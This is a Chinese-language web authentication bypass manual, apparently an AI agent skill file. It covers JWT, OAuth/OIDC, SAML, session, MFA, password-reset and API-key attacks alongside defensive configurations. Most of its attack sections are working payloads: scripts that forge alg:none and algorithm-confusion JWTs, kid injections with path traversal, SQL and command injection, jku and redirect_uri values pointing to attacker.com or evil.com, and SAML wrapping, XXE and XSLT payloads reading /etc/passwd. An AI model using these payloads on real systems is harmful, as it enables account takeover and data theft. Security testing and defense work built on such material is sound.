---
name: web-auth-bypass
description: >
  全面覆盖 Web 认证与授权绕过技术。涵盖密码认证攻击（暴力破解、撞库、凭证填充）、
  会话管理漏洞（会话固定、会话劫持、Cookie 安全）、JWT 全系列攻击
  （None 算法、算法混淆、密钥爆破、签名绕过、JWK 注入、kid 注入）、
  OAuth 2.0 / OIDC 配置缺陷（开放重定向、CSRF、scope 提升、token 泄露）、
  SAML 断言伪造、多因素认证绕过、密码重置漏洞、API 认证弱点，
  以及防御侧的安全会话管理、JWT 最佳实践、OAuth 安全配置。
domain: cybersecurity
subdomain: web-security
tags: [authentication-bypass, jwt, oauth, session-hijacking, brute-force, credential-stuffing, mfa-bypass, saml, owasp-a7]
version: 2.0.0
---

# Web 认证与授权绕过 — 完整攻防手册

## 适用场景

- 登录系统、API 认证、SSO 机制需要安全评估
- JWT/OAuth/SAML 实现需要审计
- 发现会话管理异常（固定会话 ID、可预测 token）
- 多因素认证是否可绕过需要验证
- 密码重置流程是否安全需要测试

---

## Part A：攻击方法论

### 1. JWT 攻击

#### 1.1 JWT 结构回顾

```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE

Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"user":"admin","role":"user","exp":1234567890}
```

#### 1.2 None 算法攻击

```bash
# 修改 header 移除签名算法，清空签名
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user":"admin","role":"admin"}

# 手工构造
header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
payload=$(echo -n '{"user":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
token="${header}.${payload}."

# 变体（某些库接受）
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}
{"alg":"NONE,HS256","typ":"JWT"}  # 某些解析器取第一个
```

#### 1.3 算法混淆攻击（RS256 → HS256）

```python
# 如果服务端使用 RS256（非对称），将算法改为 HS256（对称）
# 并用公钥作为 HMAC 密钥签名

import jwt
import base64

# 1. 获取服务端公钥（从 /jwks.json 或证书）
public_key = open('public.pem').read()

# 2. 用公钥作为 HMAC 密钥构造新 token
payload = {"user": "admin", "role": "superadmin"}
token = jwt.encode(payload, public_key, algorithm="HS256")

# 某些库会用公钥验证 HS256 签名 → 签名有效！
```

```bash
# 使用 jwt_tool 自动化
python3 jwt_tool.py <TOKEN> -X k  # 已知密钥攻击
python3 jwt_tool.py <TOKEN> -T    # 交互式篡改
```

#### 1.4 密钥爆破

```bash
# 使用 hashcat 爆破 HMAC 密钥
hashcat -m 16500 jwt_token.txt jwt-secrets.txt

# 使用 jwt-cracker
jwt-cracker -t <TOKEN> -d wordlist.txt

# 使用 jwt_tool 字典攻击
python3 jwt_tool.py <TOKEN> -C -d jwt-secrets.txt
```

#### 1.5 JWK / jku / x5u 注入

```
# jku (JWK Set URL) 注入
# Header: {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
# 服务端从攻击者 URL 获取公钥来验证签名

# x5u (X.509 URL) 注入
# Header: {"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

# JWK 内联注入
# Header: {"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","e":"AQAB","n":"..."}}
# 将攻击者自己的公钥嵌入 header
```

#### 1.6 kid 参数注入

```
# kid (Key ID) 常用于选择验证密钥
# Header: {"alg":"HS256","typ":"JWT","kid":"key-01"}

# 路径遍历 → 使用已知文件作为密钥
{"kid":"../../dev/null"}  # 空文件作为密钥
{"kid":"/proc/self/environ"}  # 环境变量作为密钥

# SQL 注入
{"kid":"key-01' UNION SELECT 'secret'--"}

# 命令注入（如果 kid 被传入系统命令）
{"kid":"key-01|sleep 5"}
```

#### 1.7 Payload 篡改

```bash
# 修改 payload 不重新签名（测试签名验证）
# 直接 base64 decode → 修改 → base64 encode → 拼回原签名

# 常见篡改目标
{"sub":"user","role":"user"}     → {"sub":"admin","role":"admin"}
{"user_id":12345}                → {"user_id":1}  # IDOR via JWT
{"exp":1234567890}               → {"exp":9999999999}  # 延长过期
{"iss":"app.example.com"}        → {"iss":"admin.example.com"}  # 伪造签发者
```

### 2. OAuth 2.0 / OIDC 攻击

#### 2.1 开放重定向（redirect_uri）

```
# 授权码被发送到攻击者控制的 redirect_uri
# 正常: /auth?redirect_uri=https://app.com/callback
# 攻击: /auth?redirect_uri=https://attacker.com/callback
# 绕过:
/auth?redirect_uri=https://attacker.com
/auth?redirect_uri=https://app.com.callback.attacker.com  # 子域名
/auth?redirect_uri=https://app.com/../../attacker.com
/auth?redirect_uri=https://app.com%23@attacker.com       # 片段混淆
/auth?redirect_uri=https://app.com/callback?redirect=https://evil.com
```

#### 2.2 CSRF 攻击（state 参数缺失）

```
# 如果 OAuth 流程缺少 state 参数 → CSRF
# 攻击者构造恶意链接让受害者点击：
https://auth.example.com/authorize?client_id=APP&redirect_uri=https://app.com/callback&response_type=code&state=

# 受害者点击后，攻击者的授权码被绑定到受害者账户
# 攻击者获得受害者身份
```

#### 2.3 Token 泄露

```
# Implicit Flow — Token 在 URL fragment 中
# 可通过 Referer 头泄露
# 可通过 JavaScript 读取（如果存储在 sessionStorage）

# Authorization Code — Code 被截获
# 如果 redirect_uri 不安全，授权码可被窃取

# PKCE 未实现 → Code 可被重放
```

#### 2.4 Scope 提升

```
# 请求比授权更多的 scope
/auth?client_id=APP&scope=openid%20profile%20email%20admin%20superadmin

# 某些实现不验证请求的 scope 是否在注册范围内
```

### 3. SAML 攻击

```xml
<!-- SAML 断言伪造 — XML 签名绕过 -->

<!-- 1. 签名包装攻击 -->
<Response>
  <Assertion ID="_ legitimate">
    <Issuer>legitimate-idp.com</Issuer>
    <!-- 正常断言 -->
  </Assertion>
  <Assertion ID="_ attacker">
    <Issuer>attacker.com</Issuer>
    <Subject>
      <NameID>admin@target.com</NameID>
    </Subject>
    <!-- 攻击者断言（无签名） -->
  </Assertion>
  <Signature Reference="#_legitimate">
    <!-- 签名指向合法断言 -->
  </Signature>
</Response>

<!-- 2. 注释注入 -->
<NameID>admin<!---->.evil@target.com</NameID>
<!-- 某些解析器会去除注释 → admin.evil@target.com -->

<!-- 3. XXE via SAML -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Response><Assertion><NameID>&xxe;</NameID></Assertion></Response>
```

### 4. 会话管理攻击

```
# 会话固定
# 攻击者获取一个有效 session ID → 诱使受害者使用该 ID → 攻击者劫持会话
# 测试: 登录前后 session ID 是否改变
Set-Cookie: session=FIXED_ID; ...  # 登录后未重生成

# 可预测 session ID
# 测试: 收集多个 session ID，分析是否有规律

# Cookie 安全
# 检查:
Set-Cookie: session=X;              # 缺少 HttpOnly → JS 可读
Set-Cookie: session=X; HttpOnly      # 缺少 Secure → HTTP 明文传输
Set-Cookie: session=X; Secure        # 缺少 SameSite → CSRF
Set-Cookie: session=X; Path=/        # 过宽路径 → 子应用可访问
```

### 5. MFA 绕过

```
# 1. 直接访问受保护端点（绕过 MFA 检查）
POST /api/user/profile    # 登录后直接调用，服务端未验证 MFA 状态

# 2. 竞态条件
# 在 MFA 提交和验证之间有时间窗口
# 并发发送登录请求和 MFA 绕过请求

# 3. 备用码可爆破
# 8 位数字备用恢复码 → 暴力破解（如果无速率限制）

# 4. SMS OTP 可拦截
# SIM swapping、SS7 攻击、短信转发

# 5. TOTP 可预测
# 如果种子值泄露或可重置

# 6. 重置密码绕过 MFA
# 密码重置流程可能不要求 MFA → 重置密码后以新密码登录

# 7. OAuth/SSO 绕过
# 通过 SSO 登录时可能跳过 MFA 步骤

# 8. API 端点不一致
# Web 端强制 MFA，但 API 端不强制
```

### 6. 密码重置漏洞

```
# 1. 可预测重置 Token
# Token 是否为时间戳、用户名哈希、递增数字
# 测试: 请求两次重置，比较 token 模式

# 2. Token 不过期
# 重置链接永不过期 → 可被后续使用

# 3. Token 泄露 via Referer
# 重置链接中包含 token: /reset?token=SECRET
# 如果用户点击链接后页面加载外部资源 → Referer 泄露

# 4. 用户枚举
/reset?email=exists@example.com    → "Reset email sent"
/reset?email=notexist@example.com  → "Email not found"
# 差异响应暴露用户是否存在

# 5. 账号接管 via 邮件参数注入
/reset HTTP/1.1
email=victim@example.com&email=hacker@evil.com
# 某些实现发送到两个邮箱

# 6. Host Header 注入
POST /reset HTTP/1.1
Host: attacker.com
# 重置链接变为: https://attacker.com/reset?token=...
```

---

## Part B：检测与防御

### 7. JWT 安全最佳实践

```python
# Python — 安全的 JWT 实现
import jwt
from datetime import datetime, timedelta

SECRET = "strong-random-secret-at-least-256-bits"

def create_token(user_id, role):
    return jwt.encode({
        "sub": user_id,
        "role": role,
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=1),
        "iss": "app.example.com",
        "aud": "app.example.com",
        "jti": str(uuid.uuid4()),  # 唯一 ID 防重放
    }, SECRET, algorithm="HS256")

def verify_token(token):
    try:
        # 关键: 指定允许的算法（不接受 none）
        payload = jwt.decode(
            token,
            SECRET,
            algorithms=["HS256"],  # 明确白名单
            issuer="app.example.com",
            audience="app.example.com",
            options={
                "require": ["exp", "iat", "iss", "sub"],
                "verify_exp": True,
                "verify_iat": True,
            }
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

### 8. OAuth 2.0 安全配置

```
# 安全检查清单
✅ 使用 Authorization Code Flow + PKCE（非 Implicit Flow）
✅ redirect_uri 精确匹配（完整 URL，不允许通配符）
✅ 必须包含 state 参数（随机值，CSRF 防护）
✅ Token 存储在 HttpOnly Cookie（非 localStorage/sessionStorage）
✅ Scope 在注册时固定，不信任客户端请求
✅ Access Token 有效期短（15 分钟）
✅ Refresh Token 有轮换机制
✅ PKCE code_verifier/code_challenge 强制
✅ Client Secret 仅在服务端使用
```

### 9. 会话安全配置

```python
# Python Flask — 安全会话配置
app.config.update(
    SESSION_COOKIE_SECURE=True,     # 仅 HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # JS 不可读
    SESSION_COOKIE_SAMESITE='Lax',   # CSRF 防护
    PERMANENT_SESSION_LIFETIME=3600, # 1小时过期
    SECRET_KEY=os.urandom(32),       # 强随机密钥
)

@app.route('/login', methods=['POST'])
def login():
    if verify_credentials(request.form):
        session.regenerate()  # 登录后重生成 session ID（关键）
        session['user_id'] = user.id
        session['mfa_completed'] = False
        return redirect('/mfa')
```

```
# 安全 Cookie 模板
Set-Cookie: session=RANDOM_256BIT; HttpOnly; Secure; SameSite=Strict; Path=/app; Max-Age=3600
```

---

## 速查表

### JWT 攻击速查

| 攻击 | 条件 | 方法 | 验证 |
|------|------|------|------|
| None 算法 | 服务端接受 alg=none | 改 header 算法为 none，清空签名 | 签名为空但 token 有效 |
| RS256→HS256 | 知道公钥 | 改算法为 HS256，用公钥签名 | 签名验证通过 |
| 密钥爆破 | 使用弱密钥 | hashcat -m 16500 字典攻击 | 找到密钥后可伪造任意 token |
| jku 注入 | 服务端从 URL 加载 JWK | 指向攻击者 JWKS 端点 | 用攻击者密钥签的 token 有效 |
| kid 注入 | kid 参与密钥选择 | 路径遍历/SQL 注入 | 使用非预期密钥验证 |
| Payload 篡改 | 签名验证有缺陷 | 直接修改 payload | 签名不变但 payload 被接受 |

### 认证绕过决策树

```
有认证机制？
├── 密码认证
│   ├── 暴力破解 → 检查速率限制、账户锁定
│   ├── 凭证填充 → 检查是否区分"用户不存在"和"密码错误"
│   └── 密码重置 → 检查 token 可预测性、泄露、过期
├── Token/JWT
│   ├── None 算法 → 测试 alg=none
│   ├── 算法混淆 → RS256→HS256
│   ├── 密钥爆破 → 弱密钥
│   └── 签名绕过 → 直接篡改 payload
├── OAuth/SSO
│   ├── redirect_uri 验证 → 开放重定向
│   ├── state 参数 → CSRF
│   └── scope → 越权
├── MFA
│   ├── 直接访问 → 检查所有端点是否验证 MFA
│   ├── 竞态条件 → 并发请求
│   └── 备用码 → 暴力破解
└── 会话管理
    ├── Session 固定 → 登录后是否重生成 ID
    ├── Cookie 安全 → HttpOnly/Secure/SameSite
    └── 会话过期 → 超时和绝对过期
```

## MITRE ATT&CK 映射

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Valid Accounts | T1078 |
| Credential Access | Unsecured Credentials | T1552 |
| Credential Access | Forge Credentials | T1606 |
| Defense Evasion | Web Session Cookie | T1539 |
| Lateral Movement | Use Alternate Authentication Material | T1550 |

## 前置条件

- 目标 Web 应用可访问
- Burp Suite / jwt_tool 可用
- 了解目标使用的认证机制类型（JWT/OAuth/Session）
- 对于 JWT: 能获取有效 token 和公钥（如适用）

---

## Part C：2025-2026 更新

> 本部分补充 2025-2026 年间认证安全领域的重要变更、新型攻击手法和防御演进。

### 10. OAuth 2.1 安全变更

OAuth 2.1 于 2025-2026 年加速落地，将过去十年的安全最佳实践合并为强制要求。

```
# OAuth 2.1 核心变更
┌──────────────────────────────┬─────────────────────────────────────────────┐
│ 变更项                       │ 说明                                        │
├──────────────────────────────┼─────────────────────────────────────────────┤
│ PKCE 强制要求                │ 所有客户端使用 Authorization Code Flow      │
│                              │ 必须实现 PKCE（不再仅限原生应用）           │
├──────────────────────────────┼─────────────────────────────────────────────┤
│ Implicit Grant 移除          │ Token 不再通过 URL fragment 直接返回        │
│                              │ 消除 Referer/JS 泄露风险                    │
├──────────────────────────────┼─────────────────────────────────────────────┤
│ ROPC 移除                    │ Resource Owner Password Credentials 废弃   │
│                              │ 密码不再直接分享给客户端                    │
├──────────────────────────────┼─────────────────────────────────────────────┤
│ redirect_uri 精确匹配        │ 必须完整字符串匹配，禁止通配符和部分匹配   │
├──────────────────────────────┼─────────────────────────────────────────────┤
│ Refresh Token 轮换           │ 每次使用后必须签发新 token，旧 token 失效  │
├──────────────────────────────┼─────────────────────────────────────────────┤
│ DPoP（新兴标准）             │ Demonstrating Proof-of-Possession           │
│                              │ 将 token 绑定到特定密钥，防止重放          │
└──────────────────────────────┴─────────────────────────────────────────────┘
```

```bash
# 测试 OAuth 2.1 合规性
# 1. 检查是否仍支持 Implicit Flow
curl -I "https://target.com/auth?response_type=token&client_id=APP"
# 如果返回 access_token → 不合规

# 2. 检查 PKCE 是否强制
# 发送不带 code_challenge 的请求
curl "https://target.com/auth?response_type=code&client_id=APP&redirect_uri=..."
# 如果成功返回 code → PKCE 未强制

# 3. 检查 redirect_uri 是否精确匹配
curl "https://target.com/auth?client_id=APP&redirect_uri=https://evil.com"
curl "https://target.com/auth?client_id=APP&redirect_uri=https://app.com.evil.com"
# 如果成功 → 不合规

# 4. 检查 ROPC 是否仍可用
curl -X POST https://target.com/token \
  -d "grant_type=password&username=user&password=pass&client_id=APP"
# 如果返回 token → 不合规
```

**2025 标志性事件**: Spotify 于 2025年11月27日强制切换至 OAuth 2.1 + PKCE + DPoP，导致大量未更新合规的应用失效。

### 11. JWT 算法混淆攻击（更新）

#### 11.1 CVE-2026-28802 — Authlib 签名验证绕过

```python
# Authlib (Python) 高危漏洞 CVE-2026-28802
# 攻击向量: alg:none 绕过签名验证
# 影响版本: 使用 Authlib JWT 验证的所有 Python 应用

# 构造恶意 token（利用 alg:none）
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "superadmin", "exp": 9999999999}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
malicious_token = f"{h}.{p}."

# 某些 Authlib 版本会接受此 token
```

#### 11.2 CVE-2025-9485 — OAuth SSO WordPress 插件 JWT 绕过

```bash
# WordPress OAuth Single Sign On 插件 JWT 签名验证绕过
# CVE-2025-9485 — Critical
# 根因: 插件未正确验证 JWT 签名，直接信任 header 中声明的算法

# 利用方式: 修改 JWT payload 后不重新签名
# 或使用 alg:none 变体
# 直接获取 WordPress 管理员权限
```

#### 11.3 无密钥算法混淆（2025 更新手法）

```python
# 即使没有获取到公钥，也可以尝试算法混淆
# 方法: 从 JWKS 端点 (.well-known/jwks.json) 提取公钥

import requests, json, base64, jwt

# 1. 获取 JWKS
jwks_resp = requests.get("https://target.com/.well-known/jwks.json")
jwks = jwks_resp.json()

# 2. 提取 RSA 公钥参数
for key in jwks['keys']:
    n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
    e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')

    # 3. 构造 PEM 格式公钥
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    
    public_numbers = rsa.RSAPublicNumbers(e, n)
    public_key = public_numbers.public_key()
    pem = public_key.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    # 4. 算法混淆: 用公钥作为 HMAC 密钥
    payload = {"sub": "admin", "role": "admin"}
    forged_token = jwt.encode(payload, pem, algorithm="HS256")
    # 如果服务端接受 → 认证绕过
```

#### 11.4 防御强化（2025-2026）

```python
# 安全的 JWT 验证 — 2025 最佳实践
import jwt

def verify_token_safe(token, public_key):
    """严格验证 JWT — 防御所有已知攻击"""
    try:
        # 关键: 硬编码允许的算法列表，绝不可从 token 读取
        payload = jwt.decode(
            token,
            public_key,
            algorithms=["RS256"],         # 仅允许预期算法
            options={
                "verify_signature": True,  # 必须验证签名
                "require": ["exp", "iat", "iss", "sub", "aud"],
                "verify_exp": True,
                "verify_iat": True,
                "verify_iss": True,
                "verify_aud": True,
            },
            issuer="https://auth.target.com",
            audience="https://api.target.com",
        )
        # 额外检查: 拒绝 alg:none
        header = jwt.get_unverified_header(token)
        if header.get("alg", "").lower() == "none":
            return None
        return payload
    except jwt.InvalidTokenError:
        return None
```

### 12. SAML 断言伪造（2025 更新）

#### 12.1 近期 SAML 漏洞

```
# CVE-2024-4985 — GitHub 企业服务器 SAML SSO 绕过 (CVSS 10.0)
# 条件: 启用了 SAML 加密断言的 GHES 实例
# 攻击者无需预先认证即可绕过 SAML SSO
# 根因: 加密断言处理逻辑中签名验证不完整

# ruby-saml 身份认证绕过
# 根因: ReXML 和 Nokogiri 两种 XML 解析器处理方式不同
# 签名验证在一个解析器中通过，但断言内容在另一个解析器中被篡改
# 攻击方式: 在两个解析器对同一 XML 产生不同 DOM 结构的位置插入恶意数据
```

#### 12.2 SAML 签名包装攻击变体

```xml
<!-- 2025 更新的 SAML 签名包装变体 -->

<!-- 变体 1: 利用 XML 命名空间混淆 -->
<samlp:Response xmlns:samlp="..." xmlns:saml="...">
  <saml:Assertion ID="_attacker" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>superadmin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo>
      <ds:Reference URI="#_attacker">
        <!-- 签名引用指向攻击者断言但实际验证合法断言 -->
      </ds:Reference>
    </ds:SignedInfo>
  </ds:Signature>
</samlp:Response>

<!-- 变体 2: 利用 XSLT 转换 -->
<!-- 某些 SAML 库在签名验证时使用 XSLT 转换 -->
<!-- 可嵌入恶意 XSLT 载荷执行 SSRF 或信息泄露 -->
<ds:Transforms>
  <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
    <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
      <xsl:template match="/">
        <xsl:copy-of select="document('file:///etc/passwd')"/>
      </xsl:template>
    </xsl:stylesheet>
  </ds:Transform>
</ds:Transforms>
```

#### 12.3 SAML 防御强化

```python
# SAML 安全验证清单 (2025)
# 1. 验证签名必须覆盖整个 Response 而不仅是 Assertion
# 2. 使用单一 XML 解析器（避免解析器差异攻击）
# 3. 验证 Assertion ID 唯一性（防重放）
# 4. 严格验证 Audience Restriction
# 5. 检查 NotBefore / NotOnOrAfter 时间窗口
# 6. 禁用外部实体解析（防 XXE）
# 7. 限制 XSLT 转换能力
# 8. 验证 Issuer 与预期 IdP 匹配
```

### 13. OIDC Nonce 验证缺陷

```python
# OIDC nonce 参数用于防止重放攻击
# 在 /authorize 请求中发送 nonce
# ID Token 中必须包含相同的 nonce 值

# 缺陷 1: 服务端未验证 nonce
# 攻击者可截获 ID Token 并重放

# 缺陷 2: nonce 可预测
# 如果 nonce 为时间戳或递增数字 → 可被预测
# 安全做法: nonce = base64(random_bytes(32))

# 缺陷 3: nonce 未绑定到用户会话
# 攻击者流程:
# 1. 攻击者发起 OIDC 授权请求，获取合法 ID Token
# 2. 受害者发起 OIDC 授权请求
# 3. 攻击者将自己的 ID Token 注入受害者的回调
# 如果 nonce 未绑定到特定 session → 重放成功

# 缺陷 4: nonce 一次性使用未强制
# 同一 nonce 可被多次使用 → 重放攻击窗口

# 安全实现
import secrets
import hashlib

def generate_oidc_nonce(session_id):
    """生成与 session 绑定的 nonce"""
    raw = secrets.token_bytes(32)
    # 将 session_id 混入 nonce，确保绑定
    bound = raw + session_id.encode()
    return hashlib.sha256(bound).hexdigest()

def verify_oidc_nonce(id_token_nonce, expected_nonce):
    """严格验证 nonce"""
    return secrets.compare_digest(id_token_nonce, expected_nonce)
```

### 14. Passkey / FIDO2 认证安全

```
# Passkey (基于 FIDO2/WebAuthn) 是 2025-2026 认证演进的核心方向
# 设计目标: 抗钓鱼、抗重放、无密码

# FIDO2 安全特性
┌────────────────────────────────┬──────────────────────────────────────────┐
│ 特性                           │ 安全价值                                 │
├────────────────────────────────┼──────────────────────────────────────────┤
│ 基于公钥加密                   │ 私钥永不离开设备                         │
├────────────────────────────────┼──────────────────────────────────────────┤
│ 域名绑定 (RP ID)              │ 凭证仅对注册域名有效 → 抗钓鱼            │
├────────────────────────────────┼──────────────────────────────────────────┤
│ 挑战-响应 (Challenge)          │ 每次认证使用随机挑战值 → 抗重放          │
├────────────────────────────────┼──────────────────────────────────────────┤
│ 用户存在验证 (UV)             │ 需要生物识别或 PIN 确认                  │
├────────────────────────────────┼──────────────────────────────────────────┤
│ 设备绑定                       │ 凭证与特定设备关联                       │
└────────────────────────────────┴──────────────────────────────────────────┘

# Passkey 潜在攻击面
# 1. 云同步风险
#    Apple iCloud Keychain / Google Password Manager 同步 Passkey
#    → 如果云账号被入侵，Passkey 可能被滥用
#    防御: 启用云账号的硬件安全密钥保护

# 2. 蓝牙中继攻击 (混合认证)
#    FIDO2 混合认证使用 BLE 发现设备
#    → 理论上存在蓝牙中继攻击可能
#    防御: 确保 BLE 连接使用加密和距离限制

# 3. 注册流程绕过
#    如果 WebAuthn 注册端点未正确验证 attestation
#    → 攻击者可能注册不受信任的认证器
#    防御: 验证 attestation statement 和 AAGUID

# 4. 跨设备认证会话劫持
#    hybrid transport 模式下的会话管理
#    → 如果 session 未绑定到特定认证实例
#    防御: 将 session 与 credential ID 绑定
```

```javascript
// WebAuthn 注册安全验证 (服务端)
async function verifyRegistration(credential, expectedChallenge) {
    // 1. 验证 challenge 匹配
    if (credential.response.clientDataJSON.challenge !== expectedChallenge) {
        throw new Error('Challenge mismatch');
    }
    
    // 2. 验证 origin 匹配（防钓鱼）
    if (credential.response.clientDataJSON.origin !== 'https://target.com') {
        throw new Error('Origin mismatch');
    }
    
    // 3. 验证 type 为 "webauthn.create"
    if (credential.response.clientDataJSON.type !== 'webauthn.create') {
        throw new Error('Invalid type');
    }
    
    // 4. 验证 attestation（企业场景）
    // 检查 AAGUID 是否在允许列表中
    // 验证 attestation certificate 链
    
    // 5. 存储公钥和 credential ID
    // 关联到用户账户
}
```

### 15. 多因素认证绕过 — MFA Fatigue Attack

```
# MFA Fatigue Attack (也称 Push Bombing / MFA Bombing)
# 2025-2026 年持续增长的重大威胁

# 攻击流程
1. 攻击者获取用户密码（钓鱼/撞库/泄露）
2. 使用凭证尝试登录
3. 系统向用户发送 MFA 推送通知
4. 攻击者反复触发登录请求（数十次/分钟）
5. 用户因通知轰炸而疲惫/困惑
6. 用户最终点击"允许"以停止通知
7. 攻击者获得访问权限

# 高调案例
# - Uber 2022 入侵（经典案例，此后该手法大幅增加）
# - 2025-2026 年报告: 多个组织每月遭受多次 MFA 轰炸

# 防御措施
┌─────────────────────────────────┬─────────────────────────────────────────┐
│ 防御                            │ 说明                                    │
├─────────────────────────────────┼─────────────────────────────────────────┤
│ Number Matching (号码匹配)      │ 推送通知显示随机数字，用户需在设备上    │
│                                 │ 输入相同数字才能批准                    │
├─────────────────────────────────┼─────────────────────────────────────────┤
│ 上下文感知 MFA                  │ 推送中显示请求详情（位置、IP、设备）    │
│                                 │ 用户可判断是否为自身操作                │
├─────────────────────────────────┼─────────────────────────────────────────┤
│ 风险自适应认证                  │ 根据登录风险评分决定是否需要 MFA        │
│                                 │ 异常位置/设备 → 要求更强认证            │
├─────────────────────────────────┼─────────────────────────────────────────┤
│ 推送频率限制                    │ 单位时间内限制推送次数                  │
│                                 │ 超限后暂时锁定并通知安全团队            │
├─────────────────────────────────┼─────────────────────────────────────────┤
│ 禁用推送 → 使用 FIDO2/Passkey  │ 彻底消除推送攻击面                      │
│                                 │ Passkey 抗钓鱼且不需要推送              │
├─────────────────────────────────┼─────────────────────────────────────────┤
│ 地理位置限制                    │ 仅允许可信地理位置的认证请求            │
└─────────────────────────────────┴─────────────────────────────────────────┘
```

### 16. API Key 泄露检测

```bash
# 2025 API Key 泄露检测技术

# 1. 代码仓库扫描
# 使用 gitleaks 扫描 Git 历史
gitleaks detect --source . --verbose
gitleaks detect --source . --report-format json --report-path leaks.json

# 使用 trufflehog
trufflehog filesystem ./src
trufflehog git https://github.com/target/repo --only-verified

# 2. 常见泄露位置
# - GitHub/GitLab 公开仓库（提交历史、.env 文件）
# - 前端 JavaScript 代码（硬编码 API key）
# - 移动应用 APK/IPA（反编译后提取）
# - Docker 镜像（环境变量层）
# - CI/CD 日志（构建输出中打印的环境变量）
# - Pastebin / GitHub Gist 粘贴内容
# - Web 缓存（Wayback Machine、Google Cache）

# 3. API Key 识别模式
# AWS Access Key
AKIA[0-9A-Z]{16}

# AWS Secret Key
[0-9a-zA-Z/+]{40}

# Google API Key
AIza[0-9A-Za-z_-]{35}

# GitHub Token (Fine-grained)
github_pat_[0-9a-zA-Z_]{82}

# Slack Token
xox[bpsa]-[0-9]{10,13}-[0-9]{10,13}-[0-9a-zA-Z]{24,34}

# Stripe Secret Key
sk_live_[0-9a-zA-Z]{24}

# SendGrid API Key
SG\.[0-9a-zA-Z_-]{22}\.[0-9a-zA-Z_-]{43}

# Private Key (通用)
-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----

# JWT Secret (常见弱密钥)
# "secret", "password", "jwt_secret", "your-256-bit-secret"
```

```python
# CVE-2025-61928 — better-auth API Key 插件未授权密钥创建
# 攻击者无需认证即可创建特权 API Key
# 影响: 完整账户接管

# 检测方法: 发送 API Key 创建请求（未认证状态）
import requests

# 如果以下请求成功 → 存在漏洞
resp = requests.post("https://target.com/api/api-key/create", 
    json={
        "name": "test-key",
        "permissions": ["admin"]  # 尝试请求高权限
    }
    # 注意: 未发送任何认证头
)
if resp.status_code == 200:
    print("[!] 未授权 API Key 创建成功 — CVE-2025-61928")
    print(f"API Key: {resp.json()}")
```

### 17. 更新 MITRE ATT&CK 映射

| Tactic | Technique | ID | 本手册覆盖位置 |
|--------|-----------|-----|----------------|
| Initial Access | Valid Accounts | T1078 | 暴力破解、凭证填充、密码重置 |
| Initial Access | Phishing | T1566 | MFA Fatigue 推送钓鱼 |
| Credential Access | Unsecured Credentials | T1552 | API Key 泄露检测 |
| Credential Access | Forge Credentials | T1606.001 | JWT 伪造、SAML 断言伪造 |
| Credential Access | Modify Authentication Process | T1556 | OAuth redirect_uri 操纵 |
| Credential Access | Credentials from Password Stores | T1555 | 浏览器存储的 Session/Cookie |
| Defense Evasion | Web Session Cookie | T1539 | 会话固定、会话劫持 |
| Defense Evasion | Use Alternate Authentication Material | T1550.001 | Pass-the-Token (JWT/OAuth) |
| Defense Evasion | Forge Web Credentials | T1606.002 | SAML Token 伪造（Golden SAML）|
| Lateral Movement | Use Alternate Authentication Material | T1550 | OAuth Token 重用/窃取 |
| Persistence | Account Manipulation | T1098 | OAuth scope 提升、MFA 绕过 |
| Persistence | Create Account | T1136 | 未授权 API Key 创建 |
| Collection | Data from Information Repositories | T1213 | SAML 断言中提取用户信息 |

### 18. 2025-2026 速查: 新增攻击向量

```
2025-2026 认证绕过决策树（增量更新）
├── OAuth 2.1 迁移检查
│   ├── PKCE 是否强制 → 不强制则可截获授权码
│   ├── Implicit Flow 是否仍可用 → 可用则 token 可泄露
│   └── redirect_uri 是否精确匹配 → 不匹配则可开放重定向
├── JWT 新型绕过
│   ├── Authlib alg:none (CVE-2026-28802) → 测试空签名
│   ├── WordPress OAuth SSO (CVE-2025-9485) → 签名验证绕过
│   └── 无密钥算法混淆 → 从 JWKS 端点获取公钥
├── SAML 持续风险
│   ├── 解析器差异攻击 → ruby-saml 类漏洞
│   ├── 加密断言绕过 → CVE-2024-4985 类漏洞
│   └── XSLT 注入 → 签名验证中的 XSLT 处理
├── Passkey/FIDO2
│   ├── 云同步凭证窃取 → 云账号安全检查
│   ├── 注册流程绕过 → attestation 验证
│   └── 蓝牙中继攻击 → 混合认证安全
├── MFA Fatigue
│   ├── 推送轰炸 → 频率限制检查
│   ├── 号码匹配缺失 → 社工风险
│   └── 上下文信息缺失 → 用户无法判断
└── API Key
    ├── 未授权创建 → CVE-2025-61928 类漏洞
    ├── 代码仓库泄露 → gitleaks/trufflehog 扫描
